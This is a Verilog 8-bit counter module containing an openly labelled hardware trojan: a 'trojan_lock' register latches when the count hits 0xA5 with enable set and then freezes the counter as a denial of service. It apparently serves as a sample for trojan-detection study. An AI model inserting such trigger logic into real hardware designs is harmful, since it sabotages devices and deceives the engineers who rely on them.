module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg trojan_lock;
  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count <= 0;
      trojan_lock <= 0;
    end else begin
      if (count == 8'hA5 && en)
        trojan_lock <= 1'b1;
      if (trojan_lock)
        count <= count; // freeze - denial of service
      else if (en)
        count <= count + 1;
    end
  end
endmodule